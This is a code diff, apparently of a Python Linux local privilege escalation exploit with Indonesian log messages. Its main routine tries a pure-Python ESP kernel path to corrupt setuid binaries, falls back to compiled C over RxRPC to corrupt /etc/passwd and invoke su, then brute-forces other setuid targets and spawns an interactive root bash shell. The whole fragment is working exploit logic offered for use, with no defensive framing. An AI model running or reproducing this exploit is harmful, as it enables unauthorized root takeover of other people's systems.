+        WARN("Tidak ada target setuid. Beralih ke RxRPC.")
         args.mode = "rxrpc"
-
-    workdir = get_safe_workdir()
-    log_info(f"Direktori kerja untuk binary: {workdir}")
 
     temp_files = []
     success = False
 
-    # FASE 1: ESP path pada target setuid
+    # ========== FASE 1: Pure Python ESP ==========
     if args.mode in ("auto", "esp"):
         if not mods["esp4"] and not mods["esp6"]:
-            log_warn("Modul ESP tidak tersedia. ESP path mungkin gagal.")
+            WARN("Modul ESP tidak tersedia. ESP path mungkin gagal.")
         for target in targets:
             if success:
                 break
-            log_info(f"Mencoba ESP path pada target: {target}")
-            src = extract_source(target)
-            out = tempfile.mktemp(suffix="", prefix=".df_" + ''.join(random.choices(string.ascii_lowercase, k=6)), dir=workdir)
-            binary, src_path = compile_source(src, out)
-            if src_path:
-                temp_files.append(src_path)
-            if binary:
-                temp_files.append(binary)
-                rc = run_exploit(binary, mode="esp", verbose=args.verbose)
-                if rc == 0:
-                    log_ok("Exploit ESP selesai (rc=0).")
-                    if is_target_patched(target):
-                        log_ok("Target terkonfirmasi terkorupsi.")
-                        if not check_root():
+            INFO("Mencoba Pure-Python ESP path pada target: %s", target)
+            try:
+                ok = lpe_main(target)
+            except Exception as e:
+                WARN("ESP exception: %s", e)
+                ok = False
+            if ok:
+                LOG("ESP exploit selesai.")
+                if binary_patched(target):
+                    LOG("Target terkonfirmasi terkorupsi: %s", target)
+                    if not check_root():
+                        # Coba PTY bridge dulu, lalu fallback execl
+                        if not _run_pty():
                             spawn_target_shell(target)
                         else:
                             success = True
                     else:
-                        log_warn("Tidak dapat memverifikasi korupsi target.")
-                elif is_target_patched(target):
-                    log_ok("Target terkorupsi meskipun rc!=0. Spawn shell langsung...")
+                        success = True
+                else:
+                    WARN("Tidak dapat memverifikasi korupsi target.")
+            elif binary_patched(target):
+                LOG("Target terkorupsi meskipun lpe_main rc!=0.")
+                if not _run_pty():
                     spawn_target_shell(target)
                 else:
-                    log_warn(f"ESP path gagal pada {target}, rc={rc}")
+                    success = True
+            else:
+                WARN("ESP path gagal pada %s", target)
 
-    # FASE 2: RxRPC fallback
+    # ========== FASE 2: RxRPC fallback (embedded C) ==========
     if not success and args.mode in ("auto", "rxrpc"):
         if not mods["rxrpc"]:
-            log_warn("Modul rxrpc tidak tersedia. RxRPC path mungkin gagal.")
-        log_info("Mencoba RxRPC path (fallback untuk Ubuntu/namespace terblokir)...")
+            WARN("Modul rxrpc tidak tersedia. RxRPC mungkin gagal.")
+        INFO("Mencoba RxRPC path...")
         rx_target = targets[0] if targets else "/usr/bin/su"
-        src = extract_source(rx_target)
-        out = tempfile.mktemp(suffix="", prefix=".df_" + ''.join(random.choices(string.ascii_lowercase, k=6)), dir=workdir)
-        binary, src_path = compile_source(src, out)
+        src = extract_c_source(rx_target)
+        out = tempfile.mktemp(suffix="", prefix=".df_", dir=get_safe_workdir())
+        binary, src_path = compile_c_source(src, out)
         if src_path:
             temp_files.append(src_path)
         if binary:
             temp_files.append(binary)
             for attempt in range(3):
-                log_info(f"RxRPC attempt {attempt+1}/3")
-                rc = run_exploit(binary, mode="rxrpc", verbose=args.verbose)
+                INFO("RxRPC attempt %d/3", attempt + 1)
+                rc = run_c_exploit(binary, mode="rxrpc")
                 if rc == 0:
-                    log_ok("Exploit RxRPC selesai (rc=0).")
+                    LOG("Exploit RxRPC selesai (rc=0).")
                     if is_passwd_patched():
-                        log_ok("/etc/passwd terkonfirmasi terkorupsi.")
+                        LOG("/etc/passwd terkorupsi.")
                         if not check_root():
                             su_path = find_su_path()
                             if su_path:
-                                # Coba pty dulu, lalu subprocess, lalu execl
-                                rc2 = run_su_pseudo_terminal(su_path)
-                                if rc2 != 0:
-                                    rc2 = run_su_subprocess(su_path)
-                                if rc2 == 0:
-                                    success = True
-                                    break
-                                else:
-                                    log_warn("su - gagal dijalankan, coba manual.")
+                                run_su_subprocess(su_path)
                             else:
-                                log_fail("Binary su tidak ditemukan.")
+                                WARN("su tidak ditemukan.")
                         else:
                             success = True
                     break
                 elif is_passwd_patched():
-                    log_ok("/etc/passwd terkorupsi meskipun rc!=0. Jalankan su - ...")
+                    LOG("/etc/passwd terkorupsi meskipun rc!=0.")
                     su_path = find_su_path()
                     if su_path:
-                        rc2 = run_su_pseudo_terminal(su_path)
-                        if rc2 != 0:
-                            rc2 = run_su_subprocess(su_path)
-                        if rc2 == 0:
-                            success = True
-                            break
-                        else:
-                            log_warn("su - gagal, coba manual.")
+                        run_su_subprocess(su_path)
                     else:
-                        log_fail("Binary su tidak ditemukan.")
+                        WARN("su tidak ditemukan.")
                 time.sleep(0.5)
 
-    # FASE 3: Fallback brute-force semua setuid
+    # ========== FASE 3: Fallback brute-force setuid lain ==========
     if not success and args.mode == "auto":
         all_targets = find_setuid_targets()
         for target in all_targets:
@@ -894,40 +1140,36 @@ def main():
                 continue
             if success:
                 break
-            log_info(f"Fallback: mencoba target setuid lain: {target}")
-            src = extract_source(target)
-            out = tempfile.mktemp(suffix="", prefix=".df_" + ''.join(random.choices(string.ascii_lowercase, k=6)), dir=workdir)
-            binary, src_path = compile_source(src, out)
-            if src_path:
-                temp_files.append(src_path)
-            if binary:
-                temp_files.append(binary)
-                rc = run_exploit(binary, mode="esp", verbose=args.verbose)
-                if rc == 0:
-                    if is_target_patched(target):
-                        if not check_root():
-                            spawn_target_shell(target)
-                        else:
-                            success = True
-                elif is_target_patched(target):
+            INFO("Fallback: mencoba target setuid lain: %s", target)
+            try:
+                ok = lpe_main(target)
+            except Exception as e:
+                WARN("ESP exception: %s", e)
+                ok = False
+            if ok and binary_patched(target):
+                LOG("Fallback target terkorupsi: %s", target)
+                if not _run_pty():
                     spawn_target_shell(target)
+                else:
+                    success = True
+            elif binary_patched(target):
+                if not _run_pty():
+                    spawn_target_shell(target)
+                else:
+                    success = True
 
     if not args.no_cleanup:
         cleanup(temp_files)
-
     if args.drop_caches:
-        log_info("Dropping page caches...")
         drop_caches()
 
     if not success and not check_root():
-        log_fail("Semua jalur eksploitasi gagal.")
-        log_info("Saran: periksa apakah modul esp4/esp6/rxrpc di-blacklist, kernel sudah di-patch,")
-        log_info("atau jalankan dengan -v untuk detail lebih lanjut.")
+        WARN("Semua jalur eksploitasi gagal.")
         sys.exit(1)
 
     if check_root():
-        log_ok("Berhasil mendapatkan root!")
-        spawn_shell()
+        LOG("Berhasil mendapatkan root!")
+        os.execlp("/bin/bash", "bash", "-i")
 
 if __name__ == "__main__":
     main()
